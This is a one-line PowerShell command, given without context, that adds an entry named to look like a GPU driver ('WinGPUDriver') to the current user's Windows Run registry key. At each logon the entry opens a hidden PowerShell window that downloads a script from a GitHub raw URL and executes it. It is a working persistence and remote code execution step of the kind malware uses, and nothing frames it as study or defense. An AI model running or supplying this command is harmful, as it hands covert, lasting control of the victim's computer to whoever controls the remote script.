Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "WinGPUDriver" `
-Value 'powershell -w hidden -Command "iex (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Vecra.ps1\")"'
